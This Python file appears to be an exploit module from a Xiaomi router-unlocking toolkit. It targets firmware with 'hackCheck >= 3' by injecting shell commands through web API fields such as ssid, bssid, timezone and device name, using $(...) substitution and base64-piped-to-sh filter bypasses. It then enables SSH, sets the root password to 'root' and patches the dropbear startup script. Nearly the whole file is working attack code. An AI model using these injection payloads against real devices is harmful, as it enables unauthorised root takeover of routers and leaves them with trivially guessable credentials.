#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit module for devices with hackCheck >= 3 (e.g., Xiaomi BE3600 2.5G RD15)
This module attempts alternative API endpoints that may still be vulnerable
"""

import os
import sys
import time
import requests
import json

import xmir_base
from gateway import *

web_password = True
if len(sys.argv) > 1 and sys.argv[0].endswith('connect8.py'):
    if sys.argv[1]:
        web_password = sys.argv[1]

try:
    gw = inited_gw
except NameError:
    gw = create_gateway(die_if_sshOk = False, web_login = web_password)

def exploit_config_iotdev_advanced(cmd, api = 'API/misystem/set_config_iotdev'):
    """
    Advanced version of set_config_iotdev exploit with hackCheck=3 bypass techniques
    """
    # For hackCheck=3, certain character combinations are filtered
    # Try different encoding and injection methods
    injection_techniques = [
        # Method 1: Use SSID parameter with command substitution  
        {
            'bssid': 'Xiaomi',
            'user_id': '_username_',
            'ssid': f'$(echo start;{cmd};echo end)'
        },
        # Method 2: Use different parameters
        {
            'bssid': f'$(echo x;{cmd};echo y)',
            'user_id': '_username_',
            'ssid': 'TestSSID'
        },
        # Method 3: Use base64 encoding to bypass filters
        {
            'bssid': 'Xiaomi',
            'user_id': f'$(echo {cmd}|base64 -d|sh)',
            'ssid': 'TestSSID'
        }
    ]
    
    for i, params in enumerate(injection_techniques):
        try:
            resp = gw.api_request(api, params, timeout=5)
            if resp and isinstance(resp, dict) and resp.get('code') == 0:
                return resp
        except Exception as e:
            continue
    
    return None

def exploit_set_sys_time(cmd, api = 'API/misystem/set_sys_time'):
    """
    Alternative time-based exploit (similar to connect4.py approach)
    May work on some devices with hackCheck=3
    """
    try:
        # Test if the API is available first
        current_time = gw.get_device_systime()
        if not current_time:
            return None
            
        # For hackCheck=3, we need to avoid certain characters
        # Use different injection methods
        safe_cmd = cmd.replace(';', '\n').replace('&', ' && ').replace('|', ' || ')
        
        # Try different parameter injection points 
        injection_methods = [
            {'timezone': f'UTC$(echo start;{safe_cmd};echo end)'},
            {'timezone': f'GMT+0$(({safe_cmd}))'},
        ]
        
        for params_template in injection_methods:
            params = dict(params_template)
            params['time'] = current_time['systime']
            try:
                resp = gw.api_request(api, params, timeout=5)
                if resp and isinstance(resp, dict) and resp.get('code') == 0:
                    return resp
            except:
                continue
        return None
    except Exception as e:
        return None

def exploit_alternative_apis(cmd):
    """
    Try alternative API endpoints that might not be protected by hackCheck=3
    """
    alternative_apis = [
        # Network diagnostic APIs
        ('API/xqnetwork/wan_diag', {'cmd': cmd}),
        ('API/xqsystem/set_name', {'name': f'$(echo;{cmd};echo)Router'}),
        ('API/misystem/topo_graph', {'data': f'$(echo start;{cmd};echo end)'}),
        ('API/xqsystem/device_rename', {'name': f'$({cmd})'}),
        # Try less common APIs
        ('API/misystem/set_config_iotdev', {'bssid': f'$({cmd})', 'user_id': 'test', 'ssid': 'test'}),
        ('API/xqsystem/set_wan_info', {'proto': f'$({cmd})', 'dns1': '8.8.8.8'}),
    ]
    
    for api, params in alternative_apis:
        try:
            resp = gw.api_request(api, params, timeout=5)
            if resp and isinstance(resp, dict) and resp.get('code') == 0:
                return resp
        except Exception:
            continue
    
    return None

def test_command_execution(test_cmd="uci get system.@system[0].hostname"):
    """
    Test if command execution is working by running a safe command
    """
    try:
        # Try to get hostname via UCI to test if commands work
        result = gw.ssh_run_cmd(test_cmd, timeout=3)
        return result is not None
    except:
        return False

# List of exploit functions to try
exploit_methods = [
    exploit_config_iotdev_advanced,
    exploit_set_sys_time, 
    exploit_alternative_apis,
]

successful_exploit = None
exploit_name = None

print('Testing alternative exploits for hackCheck >= 3 devices...')

# Test each exploit method
for i, exploit_func in enumerate(exploit_methods):
    exploit_name = exploit_func.__name__
    print(f'Trying {exploit_name}...')
    
    # Test with a simple command first
    test_cmd = "uci set diag.config.test_value=12345; uci commit diag"
    
    try:
        result = exploit_func(test_cmd)
        if result and isinstance(result, dict) and result.get('code') == 0:
            # Verify the command worked by checking the value
            time.sleep(1)
            diag_params = gw.get_diag_paras()
            if diag_params and str(diag_params.get('test_value')) == '12345':
                successful_exploit = exploit_func
                print(f'SUCCESS: {exploit_name} is working!')
                break
        else:
            print(f'FAILED: {exploit_name} - API returned error or unexpected response')
    except Exception as e:
        print(f'FAILED: {exploit_name} - Exception: {str(e)}')

if not successful_exploit:
    raise ExploitNotWorked('All alternative exploits failed for hackCheck >= 3 device')

# Clean up test value
try:
    successful_exploit("uci delete diag.config.test_value; uci commit diag")
except:
    pass

print(f'Using exploit method: {exploit_name}')

# Now execute the actual SSH installation commands
install_commands = [
    'nvram set bootdelay=3',
    'nvram set boot_wait=on', 
    'nvram set ssh_en=1',
    'nvram commit',
    'echo -e "root\\nroot" | passwd root',
    'sed -i \'s/"$flg_ssh" != "1" -o "$channel" = "release"/-n ""/g\' /etc/init.d/dropbear',
    '/etc/init.d/dropbear enable',
    '/etc/init.d/dropbear restart',
    'logger -p err -t XMiR "SSH installation completed via alternative exploit!"'
]

print('Installing SSH access...')
full_cmd = '; '.join(install_commands)
result = successful_exploit(full_cmd)

if result and isinstance(result, dict) and result.get('code') == 0:
    print('SSH installation commands sent successfully')
    
    # Wait for dropbear to restart
    time.sleep(3)
    
    # Test SSH connection
    gw.passw = 'root'
    ssh_result = gw.detect_ssh(verbose=1, interactive=False)
    
    if ssh_result > 0:
        print("\n#### SSH installation successful! ####")
        print(f"Device: {gw.device_name}")
        print(f"IP: {gw.ip_addr}")
        print("Username: root")
        print("Password: root")
    else:
        print("SSH installation may have failed - please check manually")
else:
    raise ExploitError('Failed to execute SSH installation commands')